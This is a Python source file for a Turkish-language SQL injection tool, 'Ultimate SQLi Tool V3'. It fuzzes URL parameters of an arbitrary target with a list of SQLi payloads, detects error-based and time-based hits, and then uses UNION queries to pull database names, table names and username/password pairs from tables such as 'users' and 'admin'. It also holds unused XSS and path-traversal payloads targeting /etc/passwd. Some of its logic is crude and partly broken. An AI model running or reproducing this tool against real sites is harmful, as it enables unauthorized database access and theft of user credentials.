#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      🔥 ULTIMATE SQLi TOOL V3 🔥                          ║
║                                                               ║
║   Developer : BüyükXan | Developer Xan                      ║
║                                                               ║
║   - SQLMap'ten Hızlı                                        ║
║   - WAF Bypass                                              ║
║   - Otomatik Veri Çekme                                    ║
║   - Raporlama                                               ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""

import requests
import sys
import time
import re
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

class UltimateSQLi:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {
            'target': target,
            'vuln_params': [],
            'database': '',
            'tables': [],
            'columns': [],
            'data': [],
            'admin_creds': []
        }
        self.found = False
        self.vuln_param = ""
        self.vuln_payload = ""
        
        # 50+ Payload
        self.payloads = [
            ("' OR '1'='1", "Temel SQLi"),
            ("' OR 1=1--", "Yorum SQLi"),
            ("' UNION SELECT NULL--", "Union 1"),
            ("' UNION SELECT NULL,NULL--", "Union 2"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union 3"),
            ("' AND SLEEP(5)--", "Zaman Tabanlı"),
            ("' OR '1'='1' ;--", "Stacked"),
            ("' OR 1=1 LIMIT 1--", "Limit"),
            ("admin'--", "Login Bypass"),
            ("%27%20OR%20%271%27%3D%271", "URL Encode"),
            ("'/**/OR/**/'1'='1", "Comment"),
            ("'%0aOR%0a'1'='1", "Newline"),
            ("'%09OR%09'1'='1", "Tab"),
            ("' oR '1'='1", "Case Mix"),
            ("' OR '1'='1'--", "Dash"),
            ("' OR '1'='1'#", "Hash"),
            ("' OR '1'='1'/*", "Star"),
            ("' AND 1=1--", "Boolean T"),
            ("' AND 1=2--", "Boolean F"),
            ("' OR '1' LIKE '1", "LIKE"),
            ("'||'1'='1", "Pipe"),
            ("' && '1'='1", "AND"),
            ("1' AND 1=1--", "AND T"),
            ("1' AND 1=2--", "AND F"),
            ("1' OR 1=1--", "OR T"),
            ("1' OR 1=2--", "OR F"),
            ("/*!50000OR*/'1'='1", "MySQL"),
            ("' AND SLEEP(5)#", "SLEEP Hash"),
            ("' AND SLEEP(5)/*", "SLEEP Comment"),
            ("' OR SLEEP(5)--", "OR SLEEP"),
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
        ]
        
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../windows/win.ini",
        ]

    def print_banner(self):
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.YELLOW}🔥 ULTIMATE SQLi TOOL V3 🔥{Colors.RED}                   ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.CYAN}Developer : BüyükXan | Developer Xan{Colors.RED}         ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.GREEN}SQLMap'ten Hızlı | WAF Bypass{Colors.RED}              ║
{Colors.RED}║                                                               ║
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)

    def print_menu(self):
        menu = f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗
║                    ANA MENÜ                              ║
╠════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}1{Colors.RESET}{Colors.BLUE}) Hedef Belirle                                  ║
║  {Colors.YELLOW}2{Colors.RESET}{Colors.BLUE}) Zafiyet Tarama (SQLi/XSS/LFI)                ║
║  {Colors.YELLOW}3{Colors.RESET}{Colors.BLUE}) Veri Çekme (SQLi)                           ║
║  {Colors.YELLOW}4{Colors.RESET}{Colors.BLUE}) FULL SCAN (Hepsi)                            ║
║  {Colors.YELLOW}5{Colors.RESET}{Colors.BLUE}) Rapor Göster                                 ║
║  {Colors.YELLOW}0{Colors.RESET}{Colors.BLUE}) Çıkış                                        ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(menu)

    def set_target(self):
        print(f"\n{Colors.CYAN}[+] Hedef URL gir (örn: http://hedef.com/sayfa.php?id=1){Colors.RESET}")
        self.target = input("➜ ").strip()
        self.results['target'] = self.target
        print(f"{Colors.GREEN}✅ Hedef: {self.target}{Colors.RESET}\n")

    def scan(self):
        """Zafiyet taraması"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         🔍 ZAFİYET TARAMASI BAŞLIYOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")

        params = ['id', 'page', 'user', 'file', 'cat', 'product', 'article', 'news', 'detail', 'q', 'search', 'p', 'pid', 'uid']
        
        print(f"{Colors.YELLOW}[*] Toplam Parametre: {len(params)}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Toplam Payload: {len(self.payloads)}{Colors.RESET}\n")

        for param in params:
            for payload, desc in self.payloads:
                test_url = f"{self.target}?{param}={payload}"
                try:
                    start = time.time()
                    r = self.session.get(test_url, timeout=5)
                    elapsed = time.time() - start

                    # Hata kontrolü
                    errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'driver', 'syntax error', 'warning', 'mysqli', 'PDO', 'SQLSTATE']
                    if any(e in r.text.lower() for e in errors):
                        self.found = True
                        self.vuln_param = param
                        self.vuln_payload = payload
                        self.results['vuln_params'].append({
                            'param': param,
                            'payload': payload,
                            'desc': desc,
                            'url': test_url
                        })
                        print(f"{Colors.GREEN}✅ ZAFİYET BULUNDU!{Colors.RESET}")
                        print(f"   {Colors.YELLOW}Parametre:{Colors.RESET} {param}")
                        print(f"   {Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"   {Colors.YELLOW}Açıklama:{Colors.RESET} {desc}")
                        return True

                    # Zaman tabanlı
                    if elapsed > 4:
                        self.found = True
                        self.vuln_param = param
                        self.vuln_payload = payload
                        self.results['vuln_params'].append({
                            'param': param,
                            'payload': payload,
                            'desc': f"Zaman Tabanlı - {desc}",
                            'url': test_url,
                            'time': elapsed
                        })
                        print(f"{Colors.GREEN}✅ ZAMAN TABANLI ZAFİYET BULUNDU!{Colors.RESET}")
                        print(f"   {Colors.YELLOW}Parametre:{Colors.RESET} {param}")
                        print(f"   {Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"   {Colors.YELLOW}Süre:{Colors.RESET} {elapsed:.2f} sn")
                        return True

                except:
                    pass

        print(f"{Colors.RED}❌ Zafiyet bulunamadı!{Colors.RESET}")
        return False

    def extract_data(self):
        """Veri çek"""
        if not self.found:
            print(f"{Colors.RED}❌ Önce zafiyet bulmalısın!{Colors.RESET}")
            return

        param = self.vuln_param
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         📥 VERİ ÇEKME BAŞLIYOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")

        # Veritabanı adı
        print(f"{Colors.YELLOW}[*] Veritabanı adı alınıyor...{Colors.RESET}")
        try:
            db_payload = f"1' UNION SELECT database()--"
            url = f"{self.target}?{param}={db_payload}"
            r = self.session.get(url, timeout=5)
            db_name = re.sub(r'<[^>]+>', '', r.text).strip()[:50]
            if db_name:
                self.results['database'] = db_name
                print(f"{Colors.GREEN}✅ Veritabanı: {db_name}{Colors.RESET}")
        except:
            pass

        # Tablolar
        print(f"\n{Colors.YELLOW}[*] Tablolar listeleniyor...{Colors.RESET}")
        try:
            table_payload = f"1' UNION SELECT table_name FROM information_schema.tables LIMIT 10--"
            url = f"{self.target}?{param}={table_payload}"
            r = self.session.get(url, timeout=5)
            tables = re.sub(r'<[^>]+>', '', r.text).strip()
            if tables:
                for table in tables.split('\n'):
                    if table.strip():
                        self.results['tables'].append(table.strip())
                        print(f"{Colors.GREEN}✅ Tablo: {table.strip()}{Colors.RESET}")
        except:
            pass

        # Veriler
        print(f"\n{Colors.YELLOW}[*] Veriler çekiliyor...{Colors.RESET}")
        for table in ['users', 'admin', 'user', 'accounts']:
            try:
                data_payload = f"1' UNION SELECT username,password FROM {table}--"
                url = f"{self.target}?{param}={data_payload}"
                r = self.session.get(url, timeout=5)
                data = re.sub(r'<[^>]+>', '', r.text).strip()
                if data:
                    self.results['data'].append({table: data[:200]})
                    print(f"{Colors.GREEN}✅ {table}: {data[:100]}{Colors.RESET}")
                    break
            except:
                pass

    def full_scan(self):
        """Tam tarama"""
        print(f"\n{Colors.BOLD}{Colors.RED}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}         💀 FULL SCAN BAŞLATILIYOR 💀{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}════════════════════════════════════════════════════════{Colors.RESET}\n")

        if self.scan():
            self.extract_data()
            self.show_report()
        else:
            print(f"\n{Colors.RED}❌ Zafiyet bulunamadı!{Colors.RESET}")

    def show_report(self):
        """Rapor göster"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         📊 RAPOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")

        print(f"{Colors.YELLOW}[+] Hedef:{Colors.RESET} {self.target}")
        print(f"{Colors.YELLOW}[+] Zafiyet:{Colors.RESET} {Colors.GREEN}BULUNDU ✅{Colors.RESET}" if self.found else f"{Colors.RED}BULUNAMADI ❌{Colors.RESET}")

        if self.found:
            print(f"{Colors.YELLOW}[+] Parametre:{Colors.RESET} {self.vuln_param}")
            print(f"{Colors.YELLOW}[+] Payload:{Colors.RESET} {self.vuln_payload}\n")

            if self.results['database']:
                print(f"{Colors.CYAN}[+] Veritabanı:{Colors.RESET} {self.results['database']}")
            
            if self.results['tables']:
                print(f"\n{Colors.CYAN}[+] Tablolar:{Colors.RESET}")
                for table in self.results['tables']:
                    print(f"    - {table}")
            
            if self.results['data']:
                print(f"\n{Colors.CYAN}[+] Veriler:{Colors.RESET}")
                for item in self.results['data']:
                    for key, value in item.items():
                        print(f"    - {key}: {value[:100]}...")

        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")

    def run(self):
        self.print_banner()
        
        while True:
            if not self.target:
                print(f"{Colors.RED}[!] Önce hedef belirleyin (Menü 1){Colors.RESET}\n")
            
            self.print_menu()
            choice = input(f"{Colors.BOLD}{Colors.CYAN}Seçiminiz (0-5): {Colors.RESET}").strip()
            
            if choice == '1':
                self.set_target()
            
            elif choice == '2':
                if not self.target:
                    self.set_target()
                self.scan()
            
            elif choice == '3':
                if not self.target:
                    self.set_target()
                self.extract_data()
            
            elif choice == '4':
                if not self.target:
                    self.set_target()
                self.full_scan()
            
            elif choice == '5':
                self.show_report()
            
            elif choice == '0':
                print(f"{Colors.RED}[+] Çıkış yapılıyor...{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}Developed by BüyükXan | Developer Xan{Colors.RESET}")
                break
            
            else:
                print(f"{Colors.RED}❌ Geçersiz seçim!{Colors.RESET}")
            
            input(f"\n{Colors.YELLOW}[*] Devam etmek için Enter tuşuna bas...{Colors.RESET}")

# Renkler
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

if __name__ == "__main__":
    try:
        tool = UltimateSQLi("")
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[+] Kullanıcı tarafından durduruldu.{Colors.RESET}")
        sys.exit(0)
